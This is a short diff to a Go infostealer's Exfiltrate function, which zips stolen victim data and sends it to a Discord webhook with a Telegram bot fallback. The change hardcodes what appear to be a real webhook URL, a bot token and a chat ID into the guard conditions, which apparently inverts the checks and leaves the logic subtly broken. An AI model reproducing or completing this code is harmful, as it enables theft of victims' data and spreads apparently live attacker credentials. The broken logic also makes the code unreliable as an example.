@@ -85,7 +85,7 @@ func Exfiltrate(data *StealerData) error {
 
 	// try discord first - more reliable
 	webhook := config.DiscordWebhook
-	if webhook != "" && webhook != "DISCORD_WEBHOOK_HERE" {
+	if webhook != "" && webhook != "https://discord.com/api/webhooks/1476012056774967446/QMoimc423mQeiJ5-kFb_6Ox2LEf2R-wTtWRQhLmCQfQfKuUR-svUlHqWdBjQnCqasBzcHOOK_HERE" {
 		err = sendToDiscord(webhook, data, zipData)
 		if err == nil {
 			return nil // success, we're done
@@ -96,7 +96,7 @@ func Exfiltrate(data *StealerData) error {
 	// fallback to telegram
 	token := config.TelegramToken
 	chatID := config.TelegramChatID
-	if token != "" && token != "TELEGRAM_TOKEN_HERE" && chatID != "" {
+	if token != "" && token != "8663112401:AAH8iT2OITdNX5h4qWWQcFiU6wh3t-jToJI" && chatID != "6044905994" {
 		err = sendToTelegram(token, chatID, data, zipData)
 		if err == nil {
 			return nil
